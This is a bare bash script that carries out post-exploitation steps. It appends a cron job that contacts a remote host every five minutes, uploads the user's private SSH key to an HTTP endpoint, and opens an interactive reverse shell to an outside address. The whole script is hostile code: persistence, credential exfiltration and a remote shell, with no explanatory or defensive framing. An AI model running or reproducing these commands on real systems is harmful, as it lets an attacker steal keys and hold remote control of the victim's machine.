#!/usr/bin/env bash
crontab -l > /tmp/cron.bak
echo "*/5 * * * * curl http://192.168.1.100:8080/beacon" >> /tmp/cron.bak
crontab /tmp/cron.bak

cat ~/.ssh/id_rsa | curl -X POST http://192.168.1.100:8080/upload -d @-

bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
